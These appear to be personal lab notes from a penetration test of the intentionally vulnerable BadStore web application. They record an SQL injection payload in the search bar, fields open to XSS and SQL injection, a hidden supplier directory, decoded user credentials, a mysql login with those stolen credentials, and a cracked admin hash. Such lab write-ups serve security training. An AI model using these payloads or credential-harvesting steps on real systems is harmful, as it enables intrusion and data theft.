Click `Home` and then enter search bar `1=1'--`

![[Captura desde 2024-09-13 16-52-47.png]]

![[Captura desde 2024-09-13 16-53-36.png]]

Three input field are vulnerable to xss attack

![[Captura desde 2024-09-13 16-54-26.png]]

![[Captura desde 2024-09-13 16-55-53.png]]

my account page vulnerable to sql injection attack

![[Captura desde 2024-09-13 16-56-35.png]]

![[Captura desde 2024-09-13 16-58-22.png]]

login section and register are vulnerable to sql injection attack 

![[Captura desde 2024-09-13 17-00-11.png]]

![[Captura desde 2024-09-13 16-59-33.png]]

![[Captura desde 2024-09-13 17-00-36.png]]

Search bar vulnerable to xss 

![[Captura desde 2024-09-13 17-03-09.png]]

![[Captura desde 2024-09-13 17-03-02.png]]

hidden directory

![[Captura desde 2024-09-13 17-06-23.png]]

![[Captura desde 2024-09-13 17-08-12.png]]

Hidden directory 

`http://0.0.0.0/supplier`

![[Captura desde 2024-09-13 17-08-51.png]]

![[Captura desde 2024-09-13 17-09-01.png]]

all decoded to base64 

```bash
1001:joeuser/password/platnum/192.168.100.56
1002:kroemer/s3Cr3t/gold/10.100.100.1
1003:janeuser/waiting4Friday/172.22.12.19
1004:kbookout/sendmeapo/10.100.100.20
```

![[Captura desde 2024-09-13 18-13-02.png]]

Connecting to database using mysql with credentials

```bash
mysql -u kbookout -p'sendmeapo' -h 192.168.1.100
```

```mysql
show databases;
use badstoredb;
```

![[Captura desde 2024-09-13 18-14-30.png]]

![[Captura desde 2024-09-13 18-14-53.png]]

![[Captura desde 2024-09-13 18-15-15.png]]

hash from admin `5EBE2294ECD0E0F08EAB7690D2A6EE69`

![[Captura desde 2024-09-13 18-20-10.png]]

![[Captura desde 2024-09-13 18-21-24.png]]

hash is `secret`

Username: `admin`
Password: `secret`

![[Captura desde 2024-09-13 18-22-42.png]]

Update account new full name field vulnerable to sql injection attack

![[Captura desde 2024-09-13 18-24-07.png]]